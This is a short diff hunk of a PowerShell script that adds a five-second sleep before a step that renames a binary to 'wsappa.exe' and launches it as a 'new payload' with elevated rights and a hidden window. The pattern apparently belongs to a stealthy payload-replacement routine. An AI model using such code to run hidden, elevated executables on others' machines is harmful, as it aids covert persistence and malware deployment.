@@ -13,6 +13,9 @@ start-sleep 5
 #change name
 rename-item new_wsappa.exe wsappa.exe
 
+#sleep
+start-sleep 5
+
 #start new payload
 Start-Process -FilePath "wsappa.exe" -Verb RunAs -WindowStyle Hidden
 
